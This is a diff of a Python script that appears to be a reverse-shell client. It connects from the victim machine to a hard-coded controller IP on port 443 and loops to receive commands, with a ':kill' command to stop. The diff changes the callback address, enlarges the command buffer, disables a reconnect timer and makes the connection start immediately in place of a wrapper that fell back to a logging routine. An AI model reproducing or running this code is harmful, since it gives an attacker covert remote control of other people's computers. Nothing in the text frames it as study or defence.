@@ -37,7 +37,7 @@ Version : v2.2
 """
 
 
-host = '10.0.0.70'
+host = '10.0.0.54'
 #host = '147.9.115.227'
 #host = '147.9.25.152'
 port = 443
@@ -47,7 +47,7 @@ def connect_client_side():
 
                 global host, port
 
-                threading.Timer(2,connect_client_side).start()
+                #threading.Timer(2,connect_client_side).start()
                 
                 # create a socket object
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -58,7 +58,7 @@ def connect_client_side():
                 while True:
 
                     # wait for the server for more commands
-                    user_command = sock.recv(1024)
+                    user_command = sock.recv(4024)
                     
                     # if the server sends ":kill" command, stop the shell
                     if user_command.strip() == ':kill':
@@ -127,30 +127,32 @@ def connect_client_side():
                     else:
                         sock.send("\n [*] ERROR: Entered Wrong Command. Type [Menu] to get the list of commands\n\n")  
 
-       
-def shell():
 
-    threading.Timer(6,get_current_connection).start()  
-    # check the connection
-    conn = get_current_connection()
-    
-    if conn == True :  
-         connect_client_side()
-    else:
-         begin_logging()
-    
-         
+connect_client_side()
 
-def main():
-
-    # start the shell
-    shell()
-    
-
-
-if __name__ == "__main__" :
-
-        main()
-
+##def shell():
+##
+##    threading.Timer(6,get_current_connection).start()  
+##    # check the connection
+##    conn = get_current_connection()
+##    
+##    if conn == True :  
+##         connect_client_side()
+##    else:
+##         begin_logging()
+##    
+##         
+##
+##def main():
+##
+##    # start the shell
+##    shell()
+##    
+##
+##
+##if __name__ == "__main__" :
+##
+##        main()
+##
 
 
